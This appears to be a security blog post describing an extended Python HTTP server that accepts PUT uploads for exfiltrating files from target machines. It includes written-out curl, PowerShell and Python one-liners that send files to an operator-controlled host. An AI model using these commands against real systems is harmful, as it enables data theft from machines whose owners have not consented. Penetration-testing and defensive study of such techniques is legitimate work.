---
title: Python HTTP Server with PUT Support
date_created: 2021-07-23
date_updated: 
metadata: research
---
# Python HTTP Server with PUT Support

Given that it is possible to exfiltrate files using `/dev/tcp` as discussed [here](/exploring-dev-tcp) for some Linux machines, I needed other ways to exfiltrate files for Windows systems or Linux systems that don't have bash.

This led me to the Python3 module `http.server`. Extending its functionalities to support `PUT` requests should allow me to exfiltrate files from other machines. This way, it would be possible to send files from various systems as long as we can build HTTP requests. 

The code is available in this [repository](https://github.com/w0lfram1te/extended-http-server).

## Quick Use

Commands shown below in case you want to get into the action quickly and without sifting through files the repository. This will download the file and launch the server on port 8000 and will listen on all interfaces by default. 

```bash
wget https://raw.githubusercontent.com/w0lfram1te/extended-http-server/main/ehttpserver.py
python3 ehttpserver.py
```

Since this is modeled after the base `http.server` module, it is also possible to indicate port and bind address. Shown below is the help screen from `python3 ehttpserver.py --help` for more information.

```
usage: ehttpserver.py [-h] [-b BIND] [-p PORT] [port]

Extended HTTP Server by w0lfram1te

positional arguments:
  port                  listening port

optional arguments:
  -h, --help            show this help message and exit
  -b BIND, --bind BIND  bind address
  -p PORT, --port PORT  listening port
```

## Sending Data

Now that we have a web server we can `PUT` files to, we can use the following techniques to send it over. Use whichever is available on the target machine.

1. **curl PUT Request**. Not all systems have curl, though, so do check beforehand. 

	```bash
	curl -T FILE http://local.ip/
	```
	
2. **Powershell PUT Request**. Assuming powershell is available on most Windows systems, this should cover most of Windows machines that we may encounter in the wild.

	```powershell
	$body = get-content 'c:\Users\user\test.txt'
	$uri = 'http://192.168.1.1:8000/test.txt'
	invoke-webrequest -method PUT -uri $uri -body $body -usebasicparsing
	```
	
	Here's a one-liner version in case some restrictions are in place. This should work on a basic command prompt without having to drop into a powershell prompt.
	
	```powershell
	powershell -c "invoke-webrequest -method PUT -usebasicparsing -uri http://192.168.1.1:8000/test.txt -body (get-content test.txt)"
	```
	
3. **Python Requests PUT**. Though this one seems overkill at this point considering the availability of the other options. May be good to have in the future just in case. 
	
	```bash
	python3 -c 'import requests; import os; filename="test.txt"; length=os.path.getsize(filename); requests.put("http://127.0.0.1:8000/"+filename, data=open(filename, "r").read(length))'
	```
	
	Theoretically we can use any scripting language with support for HTTP requests but I thought Python would be the easiest to implement and should be the most available on machines. 

	Maybe a perl version would be good as well but that'll be something for the future.